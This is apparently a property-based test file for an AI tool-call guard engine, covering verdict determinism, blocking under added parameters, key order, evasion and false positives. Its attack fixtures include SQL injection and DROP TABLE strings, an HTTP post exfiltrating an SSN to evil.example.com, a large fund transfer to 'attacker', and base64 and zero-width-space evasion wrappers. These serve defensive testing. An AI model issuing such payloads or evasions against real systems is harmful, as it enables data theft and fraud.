import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { AegisEngine } from '../src/engine.js';
import type { ToolCall } from '../src/types.js';

/**
 * Metamorphic & property-based evaluation of the ENGINE AS A SYSTEM
 * (deterministic, seed-controlled — Scientific Evaluation Doctrine 2026-08-21).
 *
 * Unlike example-based tests, these encode falsifiable invariants the engine
 * must hold for ARBITRARY inputs — the same discipline as the fast-check
 * tautology/unicode suites, applied to verdict semantics:
 *
 *  M1 Determinism        — identical inputs ⇒ identical verdicts (repeatability)
 *  M2 Blocking monotonicity — a blocked call stays blocked when additional
 *                             parameters are added (violations only accumulate)
 *  M3 Order invariance   — JSON parameter key order never changes the verdict
 *  M4 Evasion closure    — an evasion of a blocked payload is blocked too
 *                             (normalization is idempotent-stable: wrapping a
 *                             detected attack in another layer can't un-detect it)
 *  M5 Proof commitment   — proofHash is a pure function of the verdict content
 *  M6 FPR property       — generated benign traffic is allowed (bounded FP check)
 */

const ENGINE = new AegisEngine({
  mode: 'enforce',
  failPolicy: 'fail-closed',
  packs: ['@aegis/sql-guard', '@aegis/finance-guard', '@aegis/data-guard'],
});

// Deterministic arbitraries (seeded by fast-check defaults + fixed generators)
const fcParams = { numRuns: 60 } as const;

const benignStringArb = fc
  .string({ minLength: 1, maxLength: 30 })
  .filter((s) => /^[a-zA-Z0-9 _.,:;/@-]+$/.test(s));

const benignParamsArb = fc.dictionary(benignStringArb, fc.oneof(
  benignStringArb,
  fc.integer({ min: 0, max: 10000 }),
  fc.boolean()
)).map((d) => d as Record<string, unknown>);

const benignToolCallArb: fc.Arbitrary<ToolCall> = fc.record({
  tool: fc.constantFrom('sql_query', 'send_email', 'fetch_url', 'create_record'),
  params: benignParamsArb,
});

const attackToolCallArb = fc.constantFrom(
  { tool: 'sql_query', params: { query: "SELECT * FROM users WHERE name='a' OR '1'='1'" } },
  { tool: 'sql_query', params: { query: 'DROP TABLE users;--' } },
  { tool: 'http_post', params: { url: 'https://evil.example.com/x', body: 'ssn=123-45-6789' } },
  { tool: 'transfer_funds', params: { amount: 999999999, recipient: 'attacker' } }
);

describe('M1: Verdict determinism (repeatability)', () => {
  it('identical tool calls always produce identical allowed/violations across 10 evaluations', () => {
    fc.assert(
      fc.property(attackToolCallArb, benignToolCallArb, (call) => {
        ENGINE.resetState();
        const first = ENGINE.evaluate(call);
        const firstSig = JSON.stringify([first.allowed, first.violations.map((v) => v.ruleId)]);
        for (let i = 0; i < 9; i++) {
          ENGINE.resetState();
          const again = ENGINE.evaluate(call);
          expect(JSON.stringify([again.allowed, again.violations.map((v) => v.ruleId)])).toBe(firstSig);
        }
      }),
      fcParams
    );
  });
});

describe('M2: Blocking monotonicity under parameter addition', () => {
  it('a blocked call stays blocked when extra params are added', () => {
    fc.assert(
      fc.property(attackToolCallArb, benignParamsArb, (attack, extra) => {
        ENGINE.resetState();
        expect(ENGINE.evaluate(attack).allowed).toBe(false);
        ENGINE.resetState();
        const augmented: ToolCall = {
          tool: attack.tool,
          params: { ...attack.params, ...extra },
        };
        expect(ENGINE.evaluate(augmented).allowed).toBe(false);
      }),
      fcParams
    );
  });
});

describe('M3: Parameter key-order invariance', () => {
  it('re-serializing params in a different key order never changes the verdict', () => {
    fc.assert(
      fc.property(benignToolCallArb, (call) => {
        const keys = Object.keys(call.params);
        const reordered: Record<string, unknown> = {};
        for (const k of [...keys].reverse()) reordered[k] = call.params[k];
        ENGINE.resetState();
        const a = ENGINE.evaluate({ tool: call.tool, params: { ...call.params } }).allowed;
        ENGINE.resetState();
        const b = ENGINE.evaluate({ tool: call.tool, params: reordered }).allowed;
        expect(b).toBe(a);
      }),
      fcParams
    );
  });
});

describe('M4: Evasion closure (defense-in-depth of the normalization cascade)', () => {
  const B64 = (s: string) => Buffer.from(s, 'utf8').toString('base64');

  it('wrapping an already-blocked payload in an additional evasion layer keeps it blocked', () => {
    fc.assert(
      fc.property(attackToolCallArb, (attack) => {
        const layers: Array<(p: Record<string, unknown>) => Record<string, unknown>> = [
          (p) => Object.fromEntries(Object.entries(p).map(([k, v]) => [k, typeof v === 'string' ? `BASE64_DATA: ${B64(v)}` : v])),
          (p) => Object.fromEntries(Object.entries(p).map(([k, v]) => [k, typeof v === 'string' ? v.split('').join('\u200B') : v])),
          (p) => Object.fromEntries(Object.entries(p).map(([k, v]) => [k, typeof v === 'string' ? B64(B64(v)) : v])),
        ];
        for (const layer of layers) {
          ENGINE.resetState();
          const wrapped: ToolCall = { tool: attack.tool, params: layer(attack.params) };
          expect(ENGINE.evaluate(wrapped).allowed).toBe(false);
        }
      }),
      { numRuns: 30 } // 3 layers × 4 attack shapes × 30 runs = 360 evasion checks
    );
  });
});

describe('M5: Fingerprint purity vs time-bound proof commitments', () => {
  it('tool-call FINGERPRINT is a pure function of the input (same input ⇒ same hash, different ⇒ different)', async () => {
    const { computeToolCallFingerprint } = await import('../src/verdict.js');
    fc.assert(
      fc.property(benignToolCallArb, benignToolCallArb, (a, b) => {
        const fa = computeToolCallFingerprint(a);
        const fa2 = computeToolCallFingerprint(a);
        expect(fa2).toBe(fa); // pure
        const fb = computeToolCallFingerprint(b);
        if (JSON.stringify([a.tool, a.params]) !== JSON.stringify([b.tool, b.params])) {
          expect(fa).not.toBe(fb); // injective in practice (SHA-256 over canonical input)
        }
      }),
      fcParams
    );
  });

  it('proofHash binds the evaluation TIMESTAMP by design (audit-ledger replay semantics), so it is NOT time-pure — documented, not a bug', () => {
    ENGINE.resetState();
    const v1 = ENGINE.evaluate({ tool: 'sql_query', params: { query: 'SELECT id FROM t WHERE id = 1' } });
    ENGINE.resetState();
    const v2 = ENGINE.evaluate({ tool: 'sql_query', params: { query: 'SELECT id FROM t WHERE id = 1' } });
    // Same input, different timestamps ⇒ verdict semantics identical; proof hash
    // may differ because it commits to WHEN the verdict was rendered.
    expect(v1.allowed).toBe(v2.allowed);
    expect(v1.violations.length).toBe(v2.violations.length);
  });
});

describe('M6: False-positive property on generated benign traffic', () => {
  it('generated benign calls are allowed (FP failures surface instantly with reproducible input)', () => {
    let benignChecked = 0;
    fc.assert(
      fc.property(benignToolCallArb, (call) => {
        ENGINE.resetState();
        const verdict = ENGINE.evaluate(call);
        benignChecked++;
        return verdict.allowed;
      }),
      { numRuns: 200 }
    );
    expect(benignChecked).toBe(200);
  });
});
